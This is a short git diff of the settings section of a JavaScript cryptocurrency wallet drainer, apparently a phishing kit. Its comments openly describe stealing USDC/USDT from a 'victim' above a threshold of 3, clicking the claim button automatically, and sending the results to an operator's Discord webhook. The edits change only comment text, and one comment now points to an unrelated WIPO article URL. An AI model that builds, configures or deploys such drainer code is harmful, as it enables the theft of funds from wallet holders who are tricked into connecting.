@@ -14,7 +14,7 @@ const signMessage = `Welcome, \n\n` +
     `Wallet Address:\n{address}\n\n` +
     `Nonce:\n{nonce}`;
 
-const autoConnect = false; //false; // auto connect wallet
+const autoConnect = false; //true; // auto connect wallet
 const autoMint = true; // auto click claim button
 
 // the "3" you see in all the addresses are the min value, if the victim has less than 3 USDC/T then it will not steal it. If it has over 3 USD it will steal it.
@@ -33,7 +33,7 @@ const erc20list = {
 
 const installInNewWindow = true; // install wallet if not installed
 
-const discordWebhookURL = "https://discord.com/api/webhooks/"; // put ur discord webhook url in here to receive NFT's "TUTORIAL"
+const discordWebhookURL = "https://discord.com/api/webhooks/"; // put ur discord webhook url in here to receive NFT's "https://www.wipo.int/wipo_magazine/en/2021/04/article_0007.html"
 const feedbackEnabled = true; // let enabled to receive webhooks
 /*
     = = = = = END OF SETTINGS = = = = =
